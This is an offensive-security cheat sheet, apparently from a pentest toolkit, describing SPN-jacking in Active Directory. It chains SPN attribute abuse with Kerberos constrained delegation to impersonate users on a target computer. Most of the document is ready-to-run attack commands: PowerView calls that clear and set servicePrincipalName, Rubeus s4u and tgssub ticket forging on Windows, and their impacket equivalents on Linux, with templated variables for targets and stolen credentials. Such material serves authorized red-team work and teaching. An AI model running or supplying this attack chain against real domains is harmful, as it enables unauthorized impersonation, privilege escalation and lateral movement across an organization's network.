---
technique: SPN-jacking
category: kerberos
ace: GenericAll, GenericWrite, WriteSPN (WriteProperty on servicePrincipalName)
targets: Computer
protocols: Kerberos, LDAP
remote_capable: true
tags: kerberos spn-jacking constrained-delegation s4u writespn ldap ad
---

# SPN-jacking

SPN-jacking combines Kerberos Constrained Delegation (KCD) abuse with DACL abuse. A service configured for KCD lists allowed delegation targets in `msDS-AllowedToDelegateTo`. If an attacker controls that service and has WriteSPN over another object, they can move a listed SPN from its original owner to a new target. The attacker then uses S4U2self + S4U2proxy to obtain an impersonating service ticket for the new target, swaps the SPN field in the ticket, and gains access.

**Ghost SPN-jacking**: the listed SPN doesn't currently exist on any object, add it directly to the target.

**Live SPN-jacking**: the listed SPN belongs to another object, remove it there first, then add it to the target.

## Required ACEs

| ACE | What it grants |
|-----|----------------|
| GenericAll | Full control, covers SPN manipulation |
| GenericWrite | Write to non-protected attributes including servicePrincipalName |
| WriteSPN | WriteProperty directly on the servicePrincipalName attribute |

## Windows

### Step 1: Enumerate KCD delegation targets (PowerView)

#powershell #powerview #constrained-delegation #spn

Check which SPNs server_a is allowed to delegate to via KCD.

```powershell title:"Enumerate KCD allowed delegation targets for server_a"
Get-DomainObject -Identity "$server_a" -Properties 'msDS-AllowedToDelegateTo'
```
<!-- cheat
import domain_ip
var server_a
-->

### Step 2: Clear SPN from original owner (PowerView)

#powershell #powerview #constrained-delegation #spn

Remove the target SPN from server_b (required for live SPN-jacking).

```powershell title:"Clear SPN from original owner via PowerView"
Set-DomainObject -Identity "$server_b" -Clear 'ServicePrincipalName'
```
<!-- cheat
var server_b
-->

### Step 3: Set SPN on new target (PowerView)

#powershell #powerview #constrained-delegation #spn

Write the SPN onto server_c so that delegation can be redirected to it.

```powershell title:"Set SPN on new target object via PowerView"
Set-DomainObject -Identity "$server_c" -Set @{ServicePrincipalName='cifs/serverB'}
```
<!-- cheat
var server_c
-->

### Step 4: S4U to obtain impersonating ticket (Rubeus)

#powershell #rubeus #s4u2self #s4u2proxy

Use S4U2self and S4U2proxy to obtain a service ticket impersonating the target user for the SPN.

```powershell title:"S4U impersonation via Rubeus for SPN-jacked target"
.\Rubeus.exe s4u /nowrap /msdsspn:"cifs/serverB" /impersonateuser:"$impersonate_user" /domain:"$domain" /user:"$server_a_account" /password:"$server_a_pass"
```
<!-- cheat
import domain_ip
var impersonate_user
var server_a_account
var server_a_pass
-->

### Step 5: Patch SPN in ticket to new target (Rubeus)

#powershell #rubeus #constrained-delegation #spn

Rewrite the SPN inside the obtained ticket to point to server_c for access.

```powershell title:"Patch ticket SPN to new target via Rubeus tgssub"
.\Rubeus.exe tgssub /nowrap /altservice:"host/$server_c" /ticket:"$b64_ticket"
```
<!-- cheat
var server_c
var b64_ticket
-->

## Linux

### Step 1: Enumerate KCD delegation targets (findDelegation.py)

#python #impacket #constrained-delegation #spn

Check which SPNs server_a is configured to delegate to via KCD.

```sh title:"Enumerate KCD delegation targets via findDelegation.py"
findDelegation.py -user "$server_a" "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var server_a
-->

### Step 2: Clear SPN from original owner (addspn.py)

#python #impacket #constrained-delegation #spn

Remove the target SPN from server_b (required for live SPN-jacking).

```sh title:"Clear SPN from original owner via addspn.py"
addspn.py --clear -t "$server_b" -u "$domain/$user" -p "$pass" "$dc_fqdn"
```
<!-- cheat
import domain_ip
import users
import passwords
var server_b
var dc_fqdn
-->

### Step 3: Set SPN on new target (addspn.py)

#python #impacket #constrained-delegation #spn

Write the SPN onto server_c to redirect delegation to the new target.

```sh title:"Set SPN on new target object via addspn.py"
addspn.py -t "$server_c" --spn "cifs/serverB" -u "$domain/$user" -p "$pass" -c "$dc_fqdn"
```
<!-- cheat
import domain_ip
import users
import passwords
var server_c
var dc_fqdn
-->

### Step 4: S4U to obtain impersonating ticket (getST.py)

#python #impacket #s4u2self #s4u2proxy

Use S4U2self and S4U2proxy to get a service ticket impersonating the target user for the SPN.

```sh title:"S4U impersonation via getST.py for SPN-jacked target"
getST.py -spn "cifs/serverB" -impersonate "$impersonate_user" "$domain/$server_a_account:$server_a_pass"
```
<!-- cheat
import domain_ip
var impersonate_user
var server_a_account
var server_a_pass
-->

### Step 5: Patch SPN in ticket to new target (tgssub.py)

#python #impacket #constrained-delegation #spn

Rewrite the SPN inside the obtained ticket to point to server_c for access.

```sh title:"Patch ticket SPN to new target via tgssub.py"
tgssub.py -in serverB.ccache -out newticket.ccache -altservice "cifs/$server_c"
```
<!-- cheat
var server_c
-->
